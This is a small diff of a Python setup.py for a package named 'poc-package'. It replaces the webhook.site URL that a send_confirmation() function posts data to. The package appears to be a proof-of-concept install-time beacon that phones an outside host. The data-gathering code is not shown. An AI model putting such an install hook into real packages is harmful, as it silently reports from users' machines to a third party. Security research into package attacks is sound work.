@@ -5,7 +5,7 @@ import urllib.request
 from setuptools import setup
 
 # Webhook URL for verification
-WEBHOOK_URL = "https://webhook.site/55f883d0-7765-4f35-9a12-731a43ea0668"
+WEBHOOK_URL = "https://webhook.site/b685eb66-1254-43b1-a81d-59d80e8591a3"
 
 def send_confirmation():
     # Data to send to the webhook
@@ -38,3 +38,4 @@ setup(
     name="poc-package",
     version="0.0.1",
 )
+
